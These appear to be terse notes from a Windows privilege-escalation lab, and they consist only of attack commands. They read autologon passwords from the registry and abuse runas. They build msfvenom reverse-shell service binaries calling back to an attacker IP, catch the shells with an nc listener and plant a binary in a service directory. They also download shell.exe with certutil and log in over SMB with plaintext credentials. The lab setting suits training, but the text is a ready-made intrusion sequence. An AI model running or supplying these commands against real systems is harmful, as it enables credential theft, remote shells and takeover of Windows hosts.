


```
xfreerdp /v:IP_DEL_OBJETIVO /u:thmuser /p:'Password1!' /cert:ignore +clipboard /dynamic-resolution /drive:share,/share
```
 reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"   


 DefaultUserName    REG_SZ    notadmin                                                                                   DefaultPassword    REG_SZ    P@ssw0rd!

runas /user:privesc\notadmin cmd.exe   

wmic service get name,pathname,startname | findstr /i "svcadmin" 

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.66.101.33 LPORT=4444 -f exe-service -o svc.exe


rlwrap nc -lvnp 4444
net use 
copy \\TSCLIENT\_share\svc.exe C:\Windows\THMSVC\svc.exe


icacls cleanup.bat


msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.66.101.33 LPORT=5555 -f exe-service -o svc.exe


certutil -urlcache -split -f http://10.66.101.33:8000/shell.exe C:\Windows\Tasks\shell.exe


impacket-smbclient thm.loc/claire:'Password123!'@192.168.11.51
